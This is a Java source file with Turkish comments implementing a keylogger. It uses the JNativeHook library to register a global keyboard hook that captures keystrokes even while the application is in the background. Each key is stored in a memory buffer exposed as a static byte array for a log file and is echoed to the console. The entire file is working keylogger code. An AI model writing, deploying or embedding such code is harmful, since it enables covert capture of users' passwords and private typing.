package com.isee.elfi;

import org.jnativehook.GlobalScreen;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

import java.io.ByteArrayOutputStream;
import java.io.IOException;

// Kullanıcının klavye etkileşimlerini kaydetmek için kullandığımız KeyLogger classımız
public class KeyLogger implements NativeKeyListener {
    // JNativeHook kütüphanesindeki klavye olaylarını (keyboard events) yakalamak için kullanılan
    // NativeKeyListener arayüzünün implementasyonunu yaptık

    // Kaydedeceğimiz Verimizi Geçici olarak bellekte tutmak için oluşturduk
    private ByteArrayOutputStream byteStream;

    // Kaydedilen log txt dosyasını oluşturacak olan byte[] türünde değişkenimiz
    public static byte[] savedBytes;

    public KeyLogger() {
        // KeyLogger sınıfı oluşturulduğunda değişkenimize atama yaptık
        byteStream = new ByteArrayOutputStream();
    }

    @Override
    public void nativeKeyTyped(NativeKeyEvent nativeKeyEvent) {

    }

    // Tuşa basıldığında çalışır
    @Override
    public void nativeKeyPressed(NativeKeyEvent e) {
        try {
            // Basılan tuşun String olarak halini aldık
            String keyText = NativeKeyEvent.getKeyText(e.getKeyCode());
            // Byte halini keyBytes değişkenine kaydettik
            byte[] keyBytes = keyText.getBytes();

            // ByteArrayOutputStream streamimize byte halini yazdık
            byteStream.write(keyBytes);
            byteStream.write('\n'); // yeni satıra geçtik
            // byteStream'izin son halini savedBytes'a kaydetik
            savedBytes = byteStream.toByteArray();

            // Basılan Tuşu konsola yazdırdık
            System.out.println(new String(byteStream.toByteArray()));

        } catch (IOException ex) {
            ex.printStackTrace();
        }
    }

    @Override
    public void nativeKeyReleased(NativeKeyEvent nativeKeyEvent) {

    }

    // KeyLoggerımızı başlatan fonksiyonumuz
    public void startKeyLogger() {
        try {
            // Uygulamayı işletim sisteminin giriş olaylarını dinlemek için kaydeder.
            // Bu sayede, uygulama arka planda çalışırken bile klavye girdilerini algılayabilir ve işleyebilir.
            GlobalScreen.registerNativeHook();
            // Klavye olaylarını dinleyecek ve işleyecek bir dinleyici ekler.
            GlobalScreen.addNativeKeyListener(new KeyLogger());
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

}